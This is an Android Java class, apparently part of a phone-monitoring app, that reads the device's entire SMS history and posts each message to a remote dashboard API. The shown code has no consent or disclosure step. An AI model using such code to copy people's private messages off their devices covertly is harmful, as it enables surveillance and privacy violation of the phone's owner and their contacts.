package the5concurrentnodes.mmaData.sms;


import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Message;
import android.util.Log;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import the5concurrentnodes.controllers.DataHandler;
import the5concurrentnodes.generic.Config;
import the5concurrentnodes.mmaData.interfaces.LogHandler;


public class SmsHandler implements LogHandler {

    /**
     * getSmsInformation gets the details fo the sms e.g. address, date, message and type.
     * @param cursor object containting sms history.
     * @return returns sms object.
     */
    public Sms getSmsInformation(Cursor cursor) {

        String address = cursor.getString(cursor.getColumnIndex(SmsConstants.ADDRESS_COLUMN_NAME));
        String date = cursor.getString(cursor.getColumnIndex(SmsConstants.DATE_COLUMN_NAME));
        String msg = cursor.getString(cursor.getColumnIndex(SmsConstants.BODY_COLUMN_NAME));
        String type = cursor.getString(cursor.getColumnIndex(SmsConstants.TYPE_COLUMN_NAME));

        return new Sms(type, address, msg,date);
    }


    /**
     * submitLog overrides the submitLog function of class LogHandler so that it will submit a Sms
     * JSON object to a specified url and function on the dashboard.
     * @param context is androids Context instance.
     * @param params is the JSON object of a Sms object
     */

    @Override
    public void submitLog(Context context, JSONObject params) {

        String url = Config.REST_API + "/message";
        DataHandler.submitLog(context, url, params);
    }

    public List<Sms> getAllMessages(Context context) {

        Cursor cursor = context.getContentResolver().query(Uri.parse(SmsConstants.CONTENT_SMS_URI),
                null, null, null, "date ASC");
        List<Sms> messaList = new ArrayList<>();

        if(cursor.moveToFirst()) {

            do {

                Sms sms = getSmsInformation(cursor);

                if(Integer.parseInt(sms.getType()) == SmsConstants.SMS_RECEIVED ||
                        Integer.parseInt(sms.getType()) == SmsConstants.SMS_SENT) {

                    if (Integer.parseInt(sms.getType()) == SmsConstants.SMS_RECEIVED) {

                        sms.setType("Received");

                    } else {

                        sms.setType("Sent");
                    }

                    messaList.add(sms);
                }

            } while(cursor.moveToNext());
        }
        cursor.close();

        return messaList;
    }
}
